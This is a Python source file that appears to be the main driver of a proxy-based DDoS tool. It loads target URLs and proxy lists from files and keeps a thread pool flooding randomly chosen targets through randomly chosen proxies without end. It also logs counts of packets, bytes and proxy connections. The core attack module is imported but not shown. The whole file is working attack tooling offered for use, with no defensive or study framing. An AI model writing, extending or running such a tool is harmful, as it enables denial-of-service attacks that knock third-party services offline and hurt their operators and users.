import time
import datetime
import threading
import logging
import sys
from threading import Lock
from files.workers_pool import *
from files.targets_manager import *
from files.proxy_manager import *
from files.attack import *
from files.requests_generator import *
from files.config import *
from requests import adapters

class LogSaver(logging.Handler):
    def __init__(self, file_path):
        super().__init__()
        self.__file = open(file_path, 'w')

    def emit(self, record: logging.LogRecord):
        self.__file.write(self.format(record) + '\n')
        self.__file.flush()

console_handler = logging.StreamHandler(stream=sys.stdout)
console_handler.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
console_log = logging.getLogger('console')
console_log.setLevel(logging.DEBUG)
file_log = logging.getLogger('file')
file_log.setLevel(logging.DEBUG)
my_logsaver = LogSaver('log.txt')
my_logsaver.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
file_log.addHandler(my_logsaver)
console_log.addHandler(my_logsaver)
console_log.addHandler(console_handler)

config = load_config()

class Stats:
    def notify(self, message):
        if message[0] == 'successfully connected to proxy':
            self.add_good_proxy()
        elif message[0] == 'unable to connect to proxy':
            self.add_bad_proxy()
        elif message[0] == 'packet was not sent':
            self.add_bad()
        elif message[0] == 'packet was sent':
            self.add_good()
            self.add_bytes(message[1])

    def __init__(self, start_time):
        self.__lock = Lock()
        self.__start_time = start_time
        self.__bytes = 0
        self.__good = 0
        self.__bad = 0
        self.__good_proxy = 0
        self.__bad_proxy = 0

    def add_good(self, cnt = 1):
        self.__lock.acquire()
        self.__good += cnt
        self.__lock.release()
    
    def add_bad(self, cnt = 1):
        self.__lock.acquire()
        self.__bad += cnt
        self.__lock.release()

    def add_good_proxy(self, cnt = 1):
        self.__lock.acquire()
        self.__good_proxy += cnt
        self.__lock.release()

    def add_bad_proxy(self, cnt = 1):
        self.__lock.acquire()
        self.__bad_proxy += cnt
        self.__lock.release()

    def add_bytes(self, cnt = 1):
        self.__lock.acquire()
        self.__bytes += cnt
        self.__lock.release()

    def get_good(self):
        return self.__good

    def get_bad(self):
        return self.__bad

    def get_good_proxy(self):
        return self.__good_proxy

    def get_bad_proxy(self):
        return self.__bad_proxy

    def get_bytes(self):
        return self.__bytes

    def get_start_time(self):
        return self.__start_time.strftime("%d.%m.%Y, %H:%M:%S")
class DDoS:
    def __load(self):
        self.__target_manager.load_from_file('targets.txt')
        console_log.info('Loaded targets: {0}'.format(len(self.__target_manager)))
        if len(self.__target_manager) == 0:
            console_log.critical('No targets!')
            exit(0)

        self.__proxy_manager.load_from_file('resources/proxies.txt', config)
        console_log.info('loaded proxies: {0}'.format(len(self.__proxy_manager)))
        if len(self.__proxy_manager) == 0:
            console_log.critical('No proxies!')
            exit(0)

    def get_stats(self):
        return self.__stats

    def __init__(self):
        self.__proxy_manager = ProxyManager()
        self.__target_manager = TargetManager()
        self.__weapon = Weapon(config)
        self.__stats = Stats(datetime.datetime.now())
        self.__weapon.add_observer(self.__stats)

        self.__load()

    def run(self):
        pool = WorkersPool(config.THREAD_COUNT)
        pool.start()

        while True:
            while pool.get_len() < config.THREAD_COUNT:
                pool.add_task(Task(self.__weapon.attack_url, args=(self.__target_manager.get_rand(), self.__proxy_manager.get_rand())))

        pool.join()

ddos = DDoS()
ddos_thread = threading.Thread(target=ddos.run)
ddos_thread.start()

my_types = ['Kb', 'Mb', 'Gb', 'Tb']
my_cnts = ['K', 'M', 'B', 'T']

def convert_bytes(bytes):
    if bytes < 1024:
        return None

    id = -1
    while bytes / 1024 >= 1 and id + 1 < len(my_types):
        bytes /= 1024
        id += 1
    
    return [bytes, my_types[id]]

def convert_cnt(cnt):
    if cnt < 1000:
        return cnt

    id = -1
    while cnt / 1000 >= 1 and id + 1 < len(my_cnts):
        cnt /= 1000
        id += 1
    
    return '{0:.2f}'.format(cnt) + my_cnts[id]

def gen_packages_stats():
    stats = ddos.get_stats()
    packets = max(stats.get_good()+stats.get_bad(), 1)
    delivered = 'Packages delivered: {1:.1f}% ({0})'.format(convert_cnt(stats.get_good()), stats.get_good()/(packets)*100)
    bad = 'Errors while submitting: {1:.1f}% ({0})'.format(convert_cnt(stats.get_bad()), stats.get_bad()/(packets)*100)
    proxy_connections = max(stats.get_good_proxy() + stats.get_bad_proxy(), 1)
    good_proxy_connections = 'Successful proxy connections: {1:.1f}% ({0})'.format(convert_cnt(stats.get_good_proxy()), stats.get_good_proxy()/(proxy_connections)*100)
    proxy_errors = 'Proxy connection errors: {1:.1f}% ({0})'.format(convert_cnt(stats.get_bad_proxy()), stats.get_bad_proxy()/(proxy_connections)*100)
    converted = convert_bytes(stats.get_bytes())
    bytes = 'Bytes sent: {0}'.format(stats.get_bytes())
    if converted != None:
        bytes += ' ({1:.2f} {2})'.format(stats.get_bytes(), converted[0], converted[1])

    return delivered + '\n' + bad + '\n' + good_proxy_connections + '\n' + proxy_errors + '\n' + bytes

def print_stat(timeout = 60):
    stats = ddos.get_stats()
    last = 0
    while True:
        start_time = 'Start time (UTC): {0}'.format(stats.get_start_time())
        packages_stats = gen_packages_stats()
        b = stats.get_bytes()
        delta = b - last
        last = b
        converted = convert_bytes(delta)
        if converted == None:
            bytes = 'Sent in the last {1} seconds: {0}'.format(delta, config.CONSOLE_LOG_TIMEOUT)
        else:
            bytes = 'Sent in the last {3} seconds: {0} ({1:.2f} {2})'.format(delta, converted[0], converted[1], config.CONSOLE_LOG_TIMEOUT)
        message_text = '\n' + start_time + '\n' + packages_stats + '\n' + bytes
        console_log.info(message_text)
        console_log.info('-------------------')
        time.sleep(timeout)

traffic_logger = threading.Thread(target=print_stat, args=(config.CONSOLE_LOG_TIMEOUT,))
traffic_logger.start()

ddos_thread.join()
traffic_logger.join()